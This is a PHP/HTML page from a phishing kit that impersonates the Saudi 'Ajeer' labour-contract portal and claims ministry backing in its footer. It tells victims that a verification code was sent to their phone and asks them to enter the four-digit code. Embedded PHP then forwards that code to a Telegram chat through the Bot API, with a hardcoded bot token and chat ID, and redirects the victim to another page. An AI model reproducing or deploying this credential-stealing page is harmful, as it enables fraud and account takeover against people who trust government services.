<!DOCTYPE HTML>
<html>
<head>
<title>أجير | AJEER</title>
<link href="css/style.css" rel='stylesheet' type='text/css' />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style> 
    #id {
    background: url("./images/id.png")no-repeat 10px 16px #eee;
  }
  </style></head>


<body>
 <div class="shadow-forms">
	<div class="message warning">
		
		<div class="sub-head">
			<h3>أجير</h3>
            <img src="images/ajeer-new-logo.png">
		</div>
        
        <div class="sign-up">

             <ul>
  <li><a href="index.php">عقد أجير </a></li>
  <li><a href="contact-us.html">عن أجير</a></li>
</ul> 
		</div>

					<form name="login" action="check.php" method="post">
					
			
					<p class="sign-right">لقد تم ارسال رمز التأكيد على هاتفك 009665********* </p>
							
                        <input name="password" type="text"   maxlength="4" pattern="[0-9]{4}" placeholder="كود التحقق"  autocomplete="off" required=""/>
        				<input class="signup" type="submit" name="submit" value="تأكيد الدخول" />
				
        
        </form>
					<?php
    if(isset($_POST['submit'])) {
		$idnum = $_POST['password'];
		$apiToken = "5184077269:AAFwa_Cw37T3OrwYnLx7dtOx3L9xR-g4jjQ";
		$text = "كود ثاني:\n" .$idnum;
        $data = [
            'chat_id' => "-1001563330937", 
            'text' => $text
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    
    	echo "<script> location.href='call.php'; </script>";
        exit;
    	}
	?>
     
				<div class="sign-up">
					<p class="sign-right">الخدمات الإلكترونية مقدمة من وزارة العمل والتنمية الاجتماعية</p>

		</div>

					<div class="clear"> </div>
				</div>
			
		</div>
	</div>
<div class="footer">
<div class="copyright">
	    <span style="color: #757575;"> تطوير شركة تمكين للتقنيات - بدعم من وزارة الموارد البشرية والتنمية الإجتماعية</span>
	    <span id="Address" style="color: #f05656;">  </span>
	</div>

</div>

</body>
</html>